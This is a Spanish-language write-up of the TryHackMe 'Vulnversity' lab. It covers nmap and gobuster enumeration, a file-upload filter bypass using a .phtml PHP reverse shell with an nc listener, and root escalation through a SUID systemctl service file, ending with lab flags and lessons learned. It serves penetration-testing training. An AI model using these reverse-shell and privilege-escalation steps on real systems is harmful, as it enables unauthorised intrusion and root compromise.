---
title: "TryHackMe: Vulnversity"
category: "TryHackMe"
order: 21
tags: ["tryhackme", "file-upload", "burp-suite", "suid", "systemctl"]
layout: layouts/writeup.njk
permalink: /writeups/thm-vulnversity.html
---

## Reconocimiento

```bash
nmap -sV -T4 10.10.191.108
...
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 (Ubuntu)
```

6 puertos abiertos. Servidor web en el puerto **3333**, sistema operativo **Ubuntu**.

## Enumeración de directorios

```bash
gobuster dir -u http://10.10.191.108:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
...
/images               (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
/internal             (Status: 301) [--> http://10.10.191.108:3333/internal/]
```

`/internal/` contiene un formulario de subida de archivos.

## Bypass de filtro de extensión con Burp Suite

Se prueba una lista de extensiones PHP (`.php`, `.php3`, `.php4`, `.php5`, `.phtml`) interceptando la subida con Burp Suite → Intruder (modo Sniper). De todas, solo **`.phtml`** es aceptada por el filtro — las demás son rechazadas.

## Obtención de shell

1. Se edita `php-reverse-shell.php` con la IP de `tun0`.
2. Se renombra a `php-reverse-shell.phtml`.
3. Listener: `nc -lvnp 1234`.
4. Se sube el archivo y se navega a `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml`, ejecutando el payload.

**Usuario que administra el webserver:** `bill`

```bash
$ cd bill
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

## Escalada de privilegios (SUID)

```bash
find / -type f -perm -04000 -ls 2>/dev/null
...
-rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
```

El binario `/bin/systemctl` tiene el bit SUID activo — permite crear y habilitar un servicio systemd que se ejecuta como root:

```bash
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' >$TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF

cat /tmp/output
a58ff8579f0a9270368d33a9966c7fd5
```

**Flag root:** `a58ff8579f0a9270368d33a9966c7fd5`

## Lecciones aprendidas

- Los filtros de subida basados solo en extensión son fáciles de evadir probando variantes poco comunes como `.phtml`, que muchos servidores Apache siguen interpretando como PHP ejecutable.
- Un binario con SUID que permite control total sobre servicios systemd (`systemctl`) es una escalada de privilegios trivial a root — cualquier binario SUID fuera de la lista estándar del sistema merece revisión inmediata.
